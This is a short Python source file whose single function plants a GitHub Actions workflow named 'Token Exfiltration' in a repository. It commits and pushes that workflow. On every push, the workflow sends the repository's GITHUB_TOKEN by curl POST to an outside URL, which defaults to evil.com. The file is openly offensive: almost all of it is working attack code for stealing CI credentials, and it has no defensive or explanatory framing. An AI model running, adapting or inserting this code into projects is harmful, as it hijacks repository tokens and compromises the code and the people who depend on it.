import os
import subprocess

def inject_token_stealer_workflow(repo_path: str, exfil_url: str = "http://evil.com/token") -> str:
    try:
        workflows_dir = os.path.join(repo_path, ".github", "workflows")
        os.makedirs(workflows_dir, exist_ok=True)

        workflow_content = f"""name: Token Exfiltration

on: [push]

jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - name: Steal GitHub Token
        run: |
          echo ${{ secrets.GITHUB_TOKEN }} | curl -X POST -d @- {exfil_url}
"""
        path = os.path.join(workflows_dir, "token_stealer.yml")
        with open(path, 'w') as f:
            f.write(workflow_content)

        subprocess.run(["git", "add", path], cwd=repo_path, check=True)
        subprocess.run(["git", "commit", "-m", "Add token stealer workflow"], cwd=repo_path, check=True)
        subprocess.run(["git", "push"], cwd=repo_path, check=True)

        return f"✅ Token stealer workflow injected and pushed successfully to: {repo_path}"

    except Exception as e:
        return f"❌ Error injecting token stealer workflow: {str(e)}"
